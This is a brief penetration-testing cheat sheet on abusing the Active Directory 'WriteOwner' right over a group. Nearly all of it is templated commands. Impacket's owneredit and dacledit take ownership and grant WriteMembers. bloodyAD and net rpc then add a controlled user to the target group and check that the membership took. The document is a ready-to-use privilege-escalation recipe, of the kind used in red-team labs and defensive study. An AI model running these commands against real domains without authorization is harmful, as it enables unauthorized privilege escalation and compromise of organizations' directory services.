# Write Owner

### Over a group

```shellscript
# Make our user the owner of the group
impacket-owneredit -action write -new-owner '<TARGET_USER>' -target '<TARGET_GROUP>' '<DOMAIN>'/'<CONTROLLED_USER>':'<PASSWORD>'

# Allow new members to be added to the group
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal '<TARGET_USER>' -target-dn '<DN>' '<DOMAIN>'/'<CONTROLLED_USER>':'<PASSWORD>'

# Add ourself to the group 
bloodyAD -d <DOMAIN> --host <COMPUTER> -u <CONTROLLED_USER> -p <PASSWORD> add groupMember '<TARGET_GROUP>' <TARGET_USER> 
net rpc group addmem "<GROUP>" "<TARGET_USER>" -U "<DOMAIN>"/"<CONTROLLED_USER>"%"<PASSWORD>" -S "<DC>"

# Check that our user was added
bloodyAD -u <USER> -d <DOMAIN> -p <PASSWORD> --host <COMPUTER> get object '<GROUP>' --attr member 
net rpc group members '<GROUP>' -U <DOMAIN>/<USER>%<PASSWORD> -S <DC>
```
